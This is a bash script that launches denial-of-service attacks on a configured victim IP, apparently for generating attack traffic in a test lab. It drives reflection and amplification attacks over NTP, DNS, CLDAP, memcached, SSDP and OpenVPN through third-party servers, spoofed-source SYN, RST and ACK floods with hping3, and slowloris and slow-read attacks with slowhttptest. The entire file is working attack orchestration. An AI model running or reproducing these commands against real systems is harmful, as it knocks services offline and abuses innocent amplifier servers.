#!/bin/bash

source /root/ddos_scripts/attack_spec.sh

RED='\033[0;31m' # RED Color
NC='\033[0m' # No Color


before_attack() {
    #
    # Do stuff before each attack
    #
    echo "Attacker commands will be run on: $( uname -a )"
    echo "They are executed by: $( whoami )"
    iptables -A OUTPUT
}

attack_response() {
    #
    # Perform attack which generate response
    #
    case "$ATTACK_VECTOR" in
        "ntp")
            pushd /root/ddos_scripts/ntpdos
            perl ntp_attack_prl.pl $AMP_SERVER_IP $VICTIM_IP $PKTS
            popd
            ;;
        "openvpn")
            local tmp_dir

            pushd /root/ddos_scripts/openvpn
            tmp_dir=`mktemp -d -p $(pwd)`
            for i in {1..9}; do
            bash replay_openvpn_response.sh $VICTIM_IP $LOOPS $tmp_dir &
            sleep 0.5
            done
            bash replay_openvpn_response.sh $VICTIM_IP $LOOPS $tmp_dir
            rm -r $tmp_dir
            popd
            ;;
        "dns")
            pushd /root/ddos_scripts/dns
            echo $AMP_SERVER_IP > local_server.txt
            ./dns $VICTIM_IP $__TARGET_PORT local_server.txt $__NUMBER_OF_THREADS $TIME
            popd
            ;;
        "cldap")
            pushd /root/ddos_scripts/cldap
            bash replay_cldap_response.sh $VICTIM_IP $LOOPS
            popd
            ;;
        "memcached")
            pushd /root/ddos_scripts/memcache
            echo $AMP_SERVER_IP > local_server.txt
            ./mem_cache_c $VICTIM_IP $__TARGET_PORT local_server.txt $__NUMBER_OF_THREADS $__PKTS_PER_SECONDS $TIME
            popd
            ;;
        "ssdp")
            pushd /root/ddos_scripts/ssdp
            bash replay_ssdp_response.sh $VICTIM_IP $LOOPS
            popd
            ;;
    esac
}

attack_querry() {
    #
    # Perform attack which generate querries
    #
    case "$ATTACK_VECTOR" in
        "ntp")
            pushd /root/ddos_scripts/ntpdos
            perl ntp_attack_prl.pl $VICTIM_IP $__SOURCE_IP_QUERRY $PKTS
            popd
            ;;
        "openvpn")
            local tmp_dir

            pushd /root/ddos_scripts/openvpn
            tmp_dir=`mktemp -d -p $(pwd)`
            for i in {1..9}; do
            bash replay_openvpn_querry.sh $VICTIM_IP $LOOPS $TEMP_DIR &
            done
            bash replay_openvpn_querry.sh $VICTIM_IP $LOOPS $TEMP_DIR
            rm -r $tmp_dir
            popd
            ;;
        "dns")
            pushd /root/ddos_scripts/dns
            echo $VICTIM_IP > local_server.txt
            ./dns $__SOURCE_IP_QUERRY $__TARGET_PORT local_server.txt $__NUMBER_OF_THREADS $TIME
            popd
            ;;
        "cldap")
            pushd /root/ddos_scripts/cldap
            bash replay_cldap_querry.sh $VICTIM_IP $LOOPS
            popd
            ;;
        "memcached")
            pushd /root/ddos_scripts/memcache
            echo $VICTIM_IP > local_server.txt
            ./mem_cache_c $__SOURCE_IP_QUERRY $__TARGET_PORT local_server.txt $__NUMBER_OF_THREADS $__PKTS_PER_SECONDS $TIME
            popd
            ;;
        "ssdp")
            pushd /root/ddos_scripts/ssdp
            bash replay_ssdp_querry.sh $VICTIM_IP $LOOPS
            popd
            ;;
    esac
}

attack_flood() {
    #
    # Perfrorm flood attack
    #
    local script

    case "$ATTACK_VECTOR" in
        "flood-syn")
            hping3 --rand-source -c $PKTS --faster -p ++80 -L 0 -S "$VICTIM_IP"         ;;
        "flood-rst")
            hping3 --rand-source -c $PKTS --faster -p ++80 -L 0 -M 0 -b -R "$VICTIM_IP" ;;
        "flood-ack")
            hping3 --rand-source -c $PKTS --faster -p ++80 -L 0 -A "$VICTIM_IP"         ;;
        "floods")
            #TODO need to run all of them in paralel
            hping3 --rand-source -c $PKTS --faster -p ++80 -L 0 -A "$VICTIM_IP" &
            hping3 --rand-source -c $PKTS --faster -p ++80 -L 0 -M 0 -b -R "$VICTIM_IP" &
            hping3 --rand-source -c $PKTS --faster -p ++80 -L 0 -S "$VICTIM_IP"
            ;;
    esac
}

attack_slow() {
    #
    # Slow attacks using slowhttptest utility
    #
    case "$ATTACK_VECTOR" in
        slowloris)
            slowhttptest -c $__NUMBER_OF_CONNECTIONS -H -i $__INTERVAL_BETWEEN_MESSAGES -l $TIME \
                -r $__CONNECTIONS_PER_SECOND -t GET -u "http://$VICTIM_IP" -x $__DATA_LENGTH
            ;;
        slowread)
            slowhttptest -c $__NUMBER_OF_CONNECTIONS -X -r $__CONNECTIONS_PER_SECOND -w $__WINDOW_START \
               -y $__WINDOW_END -n $__INTERVAL_BETWEEN_READ -z $__BYTES_READ -k $__REPEAT_REQ \
                -l $TIME -u "http://$VICTIM_IP"
            #slowhttptest -c 300 -X -r 200 -n 5 -z 32 -k 1 -l 20 -u http://192.168.100.206
            ;;
    esac
}


after_attack() {
    #
    # Do situff after each attack
    #

    # Make sure that all packets arrive to the destination
    iptables -vnL OUTPUT; iptables -F;iptables -X
    sleep 1
}



#### MAIN

before_attack

case "$ATTACK_VECTOR" in
    cldap|dns|ntp|ssdp|memcached|openvpn)
        case "$ATTACK_TYPE" in
            "response")
                attack_response ;;
            "querry")
                attack_querry   ;;
            *)
                echo -e "${RED}Wrong attack type argument: '$ATTACK_TYPE'!${NC}"
                exit 1
                ;;
        esac
        ;;
    slowloris|slowread)
        attack_slow     ;;
    # All other options should be flood
    *)
        attack_flood     ;;
esac

after_attack
